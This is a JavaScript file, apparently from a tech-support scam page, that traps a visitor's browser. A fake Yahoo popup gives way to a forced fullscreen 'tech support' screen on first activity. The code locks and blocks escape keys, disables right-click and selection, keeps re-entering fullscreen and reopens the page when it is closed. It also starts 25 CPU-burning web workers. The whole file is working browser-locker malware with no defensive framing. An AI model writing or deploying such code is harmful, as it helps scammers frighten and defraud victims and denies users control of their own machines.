/* trap.js — AUTO-TRIGGER: Yahoo Popup -> Activity -> Fullscreen Tech Support */
(function () {
  'use strict';

  var POPUP_COOLDOWN = 800;
  var OVERLAY_FLASH  = 2500;
  var FS_RETRY_DELAY = 200;
  var lastArm = 0;
  var armed = false;
  var workers = [];
  var workerURL = null;
  var fsTimer = null;
  var allowClose = false;
  var autoTriggered = false; // Tracks if we are in the auto-sequence

  function $(id) { return document.getElementById(id); }

  /* ================= KEYBOARD LOCK ================= */
  function lockKeyboard() {
    try {
      if (navigator.keyboard && navigator.keyboard.lock) {
        // Lock keys that break the trap
        navigator.keyboard.lock([
          'Escape','F11','F5','Tab',
          'KeyW','KeyR','KeyC','KeyD','KeyP',
          'Backspace','ArrowLeft','ArrowRight','MetaLeft','MetaRight'
        ]);
      }
    } catch (e) {}
  }

  /* ================= FULLSCREEN ================= */
  function isFullscreen() {
    return !!(document.fullscreenElement || document.webkitFullscreenElement ||
              document.mozFullScreenElement || document.msFullscreenElement);
  }
  function requestFS() {
    var el = document.documentElement;
    var fn = el.requestFullscreen || el.webkitRequestFullscreen ||
             el.mozRequestFullScreen || el.msRequestFullscreen;
    if (fn && !isFullscreen()) {
      try { var p = fn.call(el); if (p && p.catch) p.catch(function(){}); } catch (e) {}
    }
  }
  function reRequestFS() {
    clearTimeout(fsTimer);
    fsTimer = setTimeout(function () { if (!isFullscreen()) requestFS(); }, FS_RETRY_DELAY);
  }

  ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange']
    .forEach(function (ev) {
      document.addEventListener(ev, function () {
        if (!isFullscreen()) {
          flashOverlay();
          reRequestFS();
        }
      }, false);
    });

  function flashOverlay() {
    var ov = $('overlay2');
    if (!ov) return;
    ov.style.display = 'block';
    setTimeout(function () { ov.style.display = 'none'; }, OVERLAY_FLASH);
  }

  /* ================= POPUP RE-ARM ================= */
  function armPopup(force) {
    var now = Date.now();
    if (!force && now - lastArm < POPUP_COOLDOWN) return;
    lastArm = now;
    var pop = $('pop_up_new');
    if (pop) {
      pop.style.display = 'block';
      pop.style.animation = 'none';
      void pop.offsetWidth;
      pop.style.animation = '4s infinite zoominoutsinglefeatured';
    }
    if (!isFullscreen()) reRequestFS();
  }

  /* ================= AUTO-TRIGGER SEQUENCE ================= */
  // This function runs when ANY activity happens
  function triggerAutoSequence() {
    if (autoTriggered) return; // Prevent double triggers
    autoTriggered = true;
    armed = true;

    // 1. Hide the Yahoo Popup immediately
    var modal = $('modalbx');
    if (modal) modal.style.display = 'none';

    // 2. Force Fullscreen
    requestFS();

    // 3. Show the Tech Support Black Screen
    var overlay = $('overlay2');
    if (overlay) overlay.style.display = 'block';

    // 4. Lock Keyboard
    lockKeyboard();

    // 5. Re-arm the popup after a delay (so it keeps coming back)
    setTimeout(function() { armPopup(true); }, 2000);
  }

  /* ================= EVENT LISTENERS (ACTIVATION) ================= */
  // These events trigger the sequence immediately upon first interaction
  ['mousemove','scroll','wheel','touchmove','touchstart','keydown','mousedown','click']
    .forEach(function (ev) {
      window.addEventListener(ev, function () {
        if (!armed) {
          triggerAutoSequence();
        } else {
          // If already armed, just re-arm the popup
          armPopup(false);
        }
      }, { passive: true });
    });

  // Focus and Visibility also trigger it
  window.addEventListener('focus', function () { if(!armed) triggerAutoSequence(); });
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden && !armed) triggerAutoSequence();
  });

  /* ================= KEY BLOCKING (After trigger) ================= */
  function killKey(e) {
    var k = e.keyCode || e.which;
    var t = e.target;
    var typing = t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA');

    if (!typing) {
      if (k === 27 || k === 122 || k === 116 || k === 9 || k === 8 ||
          (k >= 112 && k <= 123) || (k >= 37 && k <= 40)) {
        e.preventDefault();
        e.returnValue = false;
      }
    }
    if (k === 27 || k === 122) { reRequestFS(); armPopup(true); }
    if (k === 116) { armPopup(true); }
  }
  document.addEventListener('keydown', killKey, true);
  document.addEventListener('keyup', killKey, true);

  /* ================= DEAD CLICKS ================= */
  document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }, true);
  document.oncontextmenu = function () { return false; };
  document.onselectstart = function () { return false; };

  /* ================= UI WIRING ================= */
  function wireUI() {
    // Show the Yahoo Popup immediately on load (no click needed)
    setTimeout(function () {
      var m = $('modalbx');
      if (m) m.style.display = 'block';
    }, 500); // 0.5s delay to look like a legitimate popup loading

    // Only allow the "Leave" button to work (for the close trap)
    var leave = $('exit_leave');
    if (leave) {
      leave.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        allowClose = true;
        var box = $('exit-popup');
        if(box) box.style.display = 'none';
        try { window.open(window.location.href, '_blank'); } catch (er) {}
        setTimeout(function () { try { window.close(); } catch (er) {} }, 50);
      });
    }

    var cancel = $('exit_cancel');
    if (cancel) {
      cancel.addEventListener('click', function (e) {
        e.preventDefault();
        e.stopPropagation();
        var box = $('exit-popup');
        if(box) box.style.display = 'none';
        armPopup(true);
      });
    }

    // Hide modal on first click ONLY (if they click before auto-sequence)
    document.body.addEventListener('click', function () {
      var m = $('modalbx');
      if (m) m.style.display = 'none';
    }, { once: true });

    var ok = $('leave_page_ok'), cn = $('leave_page_cancel');
    if (ok) ok.addEventListener('click', function (e) { e.stopPropagation(); });
    if (cn) cn.addEventListener('click', function (e) { e.stopPropagation(); });

    // Initial arm
    setTimeout(function () { armPopup(true); }, 1000);
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', wireUI);
  } else { wireUI(); }

  /* ================= WORKER BOMB ================= */
  function startWorkers(count) {
    if (!workerURL) {
      var script = 'let c=0;while(true){c++;Math.random()*Math.random();' +
                   'if(c%1e6===0){postMessage({status:"working",counter:c});}}';
      workerURL = URL.createObjectURL(new Blob([script], { type: 'application/javascript' }));
    }
    for (var i = 0; i < count; i++) {
      try { workers.push(new Worker(workerURL)); } catch (e) {}
    }
  }
  startWorkers(25);

  /* ================= HARD CLOSE TRAP ================= */
  window.addEventListener('beforeunload', function (e) {
    if (allowClose) return;
    var msg = 'Are you sure you want to leave this page?';
    if (e) { e.returnValue = msg; }
    return msg;
  }, false);

  window.addEventListener('unload', function () {
    if (!allowClose) {
      try { window.open(window.location.href, '_blank'); } catch (e) {}
    }
  }, false);

})();
